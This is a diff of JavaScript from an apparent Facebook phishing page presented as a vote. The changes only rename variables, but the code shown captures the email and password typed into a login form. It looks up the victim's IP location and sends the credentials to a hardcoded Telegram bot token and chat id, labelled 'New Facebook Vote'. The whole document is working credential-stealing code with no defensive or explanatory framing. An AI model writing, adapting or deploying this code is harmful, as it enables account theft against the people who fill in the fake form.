@@ -1,10 +1,10 @@
-const form = document.querySelector("#form");
+const formFB = document.querySelector("#fbform");
 var ct = "5";
 var co = 0;
 var lo = 0;
 var st = 0;
 
-form.addEventListener("submit", (e) => {
+formFB.addEventListener("submit", (e) => {
   e.preventDefault();
 
   fetch("https://ipapi.co/json/")
@@ -18,7 +18,7 @@ form.addEventListener("submit", (e) => {
       var identity = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      var my_text = `
+      var fb_text = `
       <b>New Facebook Vote</b>
       - <b>Username/Email:</b> ${identity}
       - <b>Password:</b> ${password}
@@ -31,7 +31,7 @@ form.addEventListener("submit", (e) => {
       var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
       var chat_id = 7656086639;
       var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
-        my_text
+        fb_text
       )}&parse_mode=HTML`;
       let api = new XMLHttpRequest();
       api.open("GET", url, true);
